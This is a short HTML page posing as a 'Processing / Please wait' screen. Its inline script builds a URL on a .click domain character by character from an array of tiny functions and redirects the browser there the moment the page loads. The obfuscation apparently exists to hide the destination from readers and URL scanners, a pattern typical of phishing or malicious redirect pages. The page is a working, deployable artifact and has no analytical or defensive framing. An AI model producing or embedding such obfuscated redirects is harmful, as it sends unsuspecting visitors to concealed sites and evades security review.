<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            function() { return 'h'; },
            _ => 't',
            _ => 't',
            () => 'p',
            function() { return 's'; },
            _ => ':',
            () => '/',
            () => '/',
            () => 'v',
            () => 'e',
            function() { return 'r'; },
            _ => 'g',
            _ => 'e',
            _ => 'n',
            function() { return '.'; },
            function() { return 'c'; },
            function() { return 'l'; },
            () => 'i',
            () => 'c',
            function() { return 'k'; },
            _ => '/',
            function() { return 's'; },
            () => '/',
            _ => 'n',
            _ => 'e',
            function() { return 'w'; }
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
